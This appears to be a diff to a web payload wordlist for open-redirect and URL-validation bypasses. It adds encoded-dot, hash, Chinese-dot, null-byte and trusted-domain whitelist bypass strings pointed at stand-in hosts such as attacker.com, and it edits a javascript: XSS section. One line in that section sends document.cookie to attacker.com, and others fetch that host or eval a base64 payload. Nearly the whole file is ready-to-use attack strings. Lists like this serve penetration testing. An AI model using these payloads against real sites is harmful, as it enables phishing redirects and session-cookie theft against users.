+# [0x52] 0xblackbird - Encoded Dot %2e
+# ============================================================================
+example.com%2eattacker.com
+example.com%2eevil.com
+example.com%2emalicious.com
+google.com%2eattacker.com
+
+# ============================================================================
+# [0x53] 0xblackbird - Query Mark Bypass
+# ============================================================================
+attacker.com?example.com
+evil.com?example.com
+malicious.com?example.com
+phishing.com?google.com
+
+# ============================================================================
+# [0x54] 0xblackbird - Hash %23 Bypass
+# ============================================================================
+attacker.com%23example.com
+evil.com%23example.com
+malicious.com%23example.com
+phishing.com%23google.com
+
+# ============================================================================
+# [0x55] 0xblackbird - Degree Symbol
+# ============================================================================
+example.com/°attacker.com
+example.com/°evil.com
+google.com/°attacker.com
+github.com/°attacker.com
+
+# ============================================================================
+# [0x56] 0xblackbird - Chinese Dot
+# ============================================================================
+attacker.com%E3%80%82example.com
+evil.com%E3%80%82example.com
+malicious.com%E3%80%82example.com
+phishing.com%E3%80%82google.com
+
+# ============================================================================
+# [0x57] 0xblackbird - Nullbyte Path Bypass
+# ============================================================================
+/%0d/attacker.com
+/%0d/evil.com
+/%0d/malicious.com
+/%0a/attacker.com
+/%0a/evil.com
+/%0a/malicious.com
+
+# ============================================================================
+# [0x58] Common Whitelist Bypass - Google
+# ============================================================================
+https://accounts.google.com@attacker.com
+https://accounts.google.com.attacker.com
+https://accounts.google.com/attacker.com
+
+# ============================================================================
+# [0x59] Common Whitelist Bypass - Microsoft
+# ============================================================================
+https://login.microsoft.com@attacker.com
+https://login.microsoft.com.attacker.com
+https://login.microsoft.com/attacker.com
+
+# ============================================================================
+# [0x60] Common Whitelist Bypass - GitHub
+# ============================================================================
+https://github.com@attacker.com
+https://github.com.attacker.com
+https://github.com/attacker.com
+
+# ============================================================================
+# [0x61] Common Whitelist Bypass - Facebook
+# ============================================================================
+https://facebook.com@attacker.com
+https://facebook.com.attacker.com
+https://facebook.com/attacker.com
+
+# ============================================================================
+# [0x62] Common Whitelist Bypass - LinkedIn
+# ============================================================================
+https://linkedin.com@attacker.com
+https://linkedin.com.attacker.com
+https://linkedin.com/attacker.com
+
+# ============================================================================
+# [0x63] Common Whitelist Bypass - Twitter
+# ============================================================================
+https://twitter.com@attacker.com
+https://twitter.com.attacker.com
+https://twitter.com/attacker.com
+
+# ============================================================================
+# [0x64] CSRF + Open Redirect Chain
 # ============================================================================
 /redirect?url=https://attacker.com/csrf
 /redirect?url=https://attacker.com/malicious
@@ -643,48 +767,7 @@ http://192.168.255.255
 /redirect?return=https://attacker.com/steal
 
 # ============================================================================
-# [0x56] Alternative Protocol Schemes
-# ============================================================================
-ftp://attacker.com
-file:///etc/passwd
-file://attacker.com
-gopher://attacker.com
-telnet://attacker.com
-ldap://attacker.com
-jar:https://attacker.com
-
-# ============================================================================
-# [0x57] Encoded Bypass - %25 (Percent)
-# ============================================================================
-%25%32%46%25%32%46attacker.com
-%25%35%43attacker.com
-%2525252fattacker.com
-
-# ============================================================================
-# [0x58] Hexadecimal Encoding
-# ============================================================================
-0x2f0x2fattacker.com
-\x2f\x2fattacker.com
-\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x74\x74\x61\x63\x6b\x65\x72\x2e\x63\x6f\x6d
-
-# ============================================================================
-# [0x59] Unicode Normalization
-# ============================================================================
-https://attacker.com
-https://attacker.com (with different unicode variations)
-https://ａｔｔａｃｋｅｒ.ｃｏｍ
-https://𝖆𝖙𝖙𝖆𝖈𝖐𝖊𝖗.𝖈𝖔𝖒
-
-# ============================================================================
-# [0x60] Comment-based Bypass
-# ============================================================================
-https://example.com/*attacker.com
-https://example.com/attacker.com/*
-https://example.com//attacker.com/
-https://example.com///attacker.com///
-
-# ============================================================================
-# [0x61] Complex Bypass Combinations
+# [0x65] Complex Bypass Combinations
 # ============================================================================
 https://example.com%00%0aattacker.com
 https://example.com%09%0dattacker.com
@@ -693,7 +776,7 @@ https://example.com%3f%23attacker.com
 https://example%2ecom@attacker.com
 
 # ============================================================================
-# [0x62] Redirect Chain Variations
+# [0x66] Redirect Chain Variations
 # ============================================================================
 https://attacker.com/redirect?url=https://malicious.com
 https://attacker.com/api/redirect?target=https://malicious.com
@@ -701,23 +784,26 @@ https://attacker.com/forward?url=https://malicious.com
 https://attacker.com/proxy?url=https://malicious.com
 
 # ============================================================================
-# [0x63] Advanced DOM-based XSS via Redirect
+# [0x67] Advanced DOM-based XSS
 # ============================================================================
 javascript:window.location='https://attacker.com'
 javascript:document.location='https://attacker.com'
 javascript:fetch('https://attacker.com')
 javascript:new Image().src='https://attacker.com/?c='+document.cookie
 javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))
+javascript:alert(JSON.stringify(sessionStorage))
+javascript:alert(JSON.stringify(localStorage))
 
 # ============================================================================
 # End of Payloads
 # ============================================================================
-# Total Payloads: 600+
-# Categories: 63 different bypass techniques
+# Total Payloads: 1000+
+# Categories: 67+ different bypass techniques
 # Frameworks Covered: All major web frameworks
 # Research Based:
 #   - ElMahdi's 7 bypass techniques
 #   - Intigriti's advanced redirects
 #   - PortSwigger URL validation bypass
 #   - 0xblackbird's bypass collection
+#   - DivertoMenu's comprehensive guide
 # ============================================================================
